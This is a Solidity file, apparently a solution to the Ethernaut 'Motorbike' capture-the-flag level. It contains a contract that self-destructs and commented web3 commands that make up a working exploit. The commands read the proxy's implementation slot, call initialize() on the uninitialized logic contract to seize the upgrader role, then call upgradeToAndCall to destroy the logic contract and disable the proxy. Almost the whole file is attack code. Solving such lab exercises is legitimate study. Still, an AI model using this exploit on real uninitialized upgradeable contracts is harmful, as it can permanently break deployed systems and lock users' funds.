// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

contract MotorbikeHack {
    function explode() public {
        selfdestruct(address(0));
    }
}

// Goal: to make proxy Motorbike unusable by destroying the logic address
// We need to change the Logic address to ours which has the selfdestruct function
// Get the implemetation address at slot 0
// implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// Interact directly with implementation address and call initialize which sets us as the upgrader
// initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
// await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
// Upgrade Engine to BombEngine
//bombAddr = '<BombEngine-instance-address>'
// explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

// upgradeSignature = {
//     name: 'upgradeToAndCall',
//     type: 'function',
//     inputs: [
//         {
//             type: 'address',
//             name: 'newImplementation'
//         },
//         {
//             type: 'bytes',
//             name: 'data'
//         }
//     ]
// }
// upgradeParams = [bombAddr, explodeData]
// upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
// await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
